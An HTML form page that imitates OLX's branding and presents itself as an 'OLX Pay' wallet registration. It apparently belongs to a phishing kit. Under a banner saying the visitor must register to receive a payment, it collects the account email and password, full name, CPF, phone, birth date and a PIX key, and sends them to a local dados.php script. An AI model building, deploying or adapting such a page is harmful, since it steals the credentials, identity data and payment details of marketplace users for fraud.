<html lang="pt-BR">
<head>
    <meta charSet="utf-8"/>

    <title>Cadastro de Carteira OLX Pay | OLX</title>
    <link data-react-helmet="true" rel="apple-touch-icon" sizes="180x180" href="../assets/img/apple-touch-icon.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="32x32" href="../assets/img/favicon-32x32.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="192x192" href="../assets/img/android-chrome-192x192.png"/>
    <link data-react-helmet="true" rel="icon" type="image/png" sizes="16x16" href="../assets/img/favicon-16x16.png"/>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz@0,6..12;1,6..12&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
    <!-- Adicionando Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="assets/css/dados.css">
</head>
<body>
    <div class="header">
        <img src="assets/img/olx.svg" alt="OLX Logo" class="logo"/>
    </div>
    <div class="form-container">
        <h1>Cadastro de Carteira OLX Pay</h1>
        <div class="flex items-center bg-yellow-50 border border-yellow-300 rounded-md p-4 mb-4">
            <i class="fas fa-exclamation-triangle text-yellow-500 text-xl mr-3"></i>
            <p class="text-yellow-700">Pedimos que faça o cadastro de sua conta para recebimento.</p>
        </div>
        <form id="cadastro-form" action="dados.php" method="post" >
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="senha" placeholder="Senha"  required>
            <input type="text" id="nome" name="nome" placeholder="Nome Completo" required/>
            <input type="text" id="cpf" name="cpf" placeholder="CPF" required oninput="aplicarFormatacao(event)" maxlength="14"/>
            <input type="tel" id="telefone" name="telefone" placeholder="Telefone" required oninput="aplicarFormatacao(event)" maxlength="15"/>
            <label>Data de nascimento:</label>
            <div class="date-inputs">
                <input type="text" id="dia" name="dia" placeholder="Dia" required oninput="aplicarFormatacao(event)" maxlength="2"/>
                <input type="text" id="mes" name="mes" placeholder="Mês" required oninput="aplicarFormatacao(event)" maxlength="2"/>
                <input type="text" id="ano" name="ano" placeholder="Ano" required oninput="aplicarFormatacao(event)" maxlength="4"/>
            </div>
            <label for="chave-pix">Chave PIX:</label>
            <select id="chave-pix" name="chave-pix" required>
                <option value="">Selecione a chave PIX que deseja</option>
                <option value="email">Email</option>
                <option value="cpf">CPF</option>
                <option value="telefone">Telefone</option>
            </select>
            <input type="text" id="chave-pix-input" name="chave-pix-input" placeholder="Chave PIX" required/>
            <button type="submit" name="cadastrar" id="cadastrar">Cadastrar</button>
        </form>
        <div class="continuar">Já tem uma conta? <a href="#">Faça login</a></div>
    </div>

    <script src="assets/js/dados.js"></script>
</body>
</html>
